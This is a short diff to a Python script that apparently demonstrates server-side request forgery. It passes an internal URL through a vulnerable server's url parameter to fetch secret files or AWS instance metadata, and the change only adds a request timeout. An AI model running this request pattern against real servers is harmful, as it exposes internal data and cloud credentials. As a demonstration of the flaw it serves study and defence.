@@ -17,7 +17,7 @@ internal_url = 'https://internal.secretcorp.org/secret.txt'
 exploit_url = vulnerable_url + '?url=' + internal_url
 
 # The attacker sends a request to the exploit URL.
-response = requests.get(exploit_url)
+response = requests.get(exploit_url, timeout=60)
 
 # If the vulnerable server is running inside an AWS EC2 instance, it
 # will return the instance metadata.
